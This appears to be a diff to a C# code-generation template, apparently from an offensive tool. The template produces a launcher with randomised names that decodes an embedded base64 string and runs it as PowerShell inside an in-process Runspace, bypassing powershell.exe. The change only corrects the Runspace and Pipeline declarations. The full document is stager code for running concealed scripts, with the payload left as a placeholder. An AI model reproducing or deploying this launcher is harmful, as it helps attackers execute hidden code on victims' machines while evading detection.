@@ -44,11 +44,11 @@ using System.IO; using System.Diagnostics; using System.Reflection; using System
 public class {0} {{
     public static void Main() {{
         byte[] {1} = Convert.FromBase64String("{6}");
-		string {2} = Encoding.Unicode.GetString({1});
-		{3} {3} = RunspaceFactory.CreateRunspace();
+	string {2} = Encoding.Unicode.GetString({1});
+	Runspace {3} = RunspaceFactory.CreateRunspace();
         {3}.Open();
         RunspaceInvoke {4} = new RunspaceInvoke({3});
-        {5} {5} = {3}.CreatePipeline();
+        Pipeline {5} = {3}.CreatePipeline();
         {5}.Commands.AddScript({2});
         {5}.Invoke();
         {3}.Close();
